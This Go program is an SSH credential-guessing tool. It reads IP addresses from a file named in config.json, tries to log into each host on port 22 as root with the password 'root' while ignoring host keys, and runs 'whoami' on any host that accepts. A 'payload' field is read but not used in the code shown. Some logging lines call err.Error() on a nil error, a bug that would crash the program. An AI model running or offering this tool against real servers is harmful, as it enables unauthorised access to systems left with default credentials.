package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"

	"golang.org/x/crypto/ssh"
)

func readList(name string) []string {
	lines := make([]string, 0)

	file, err := os.Open(name)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()
		lines = append(lines, line)
	}

	if err := scanner.Err(); err != nil {
		panic(err)
	}
	return lines
}
func ReadConfig() (payload interface{}, list interface{}) {
	jsonfile, err := os.Open("config.json")
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("Successfully Read Config....")
	defer jsonfile.Close()
	byteresp, _ := ioutil.ReadAll(jsonfile)
	var res map[string]interface{}
	json.Unmarshal([]byte(byteresp), &res)
	return res["payload"], res["list"]
}
func brute(ip string) {
	config := &ssh.ClientConfig{
		User: "root",
		Auth: []ssh.AuthMethod{
			ssh.Password("root"),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	conn, err := ssh.Dial("tcp", ip, config)
	if err != nil {
		// log.Fatalf("Failed to dial: %s", err)
		log.Printf("[FAILED] Failed to dial %s | Error : %s", ip, err.Error())
		return
	}
	client, err := conn.NewSession()
	if err != nil {
		// log.Fatalf("Failed to create session: %s", err)
		log.Printf("[FAILED] Failed to create session %s | Error : %s", ip, err.Error())
		return
	} else {
		log.Printf("[SUCCESS] Opened Session %s | Error : %s", ip, err.Error())
	}

	defer client.Close()
	var b bytes.Buffer
	client.Stdout = &b
	run := client.Run("whoami")
	if run != nil {
		log.Printf("Failed to run: %s  Error : %s", ip, err.Error())
		return
	}
	fmt.Println(b.String())
	return
}

func main() {
	_, l := ReadConfig()
	list := readList(l.(string))
	for i := 0; i < len(list); i++ {
		brute(list[i] + ":22")

	}
}
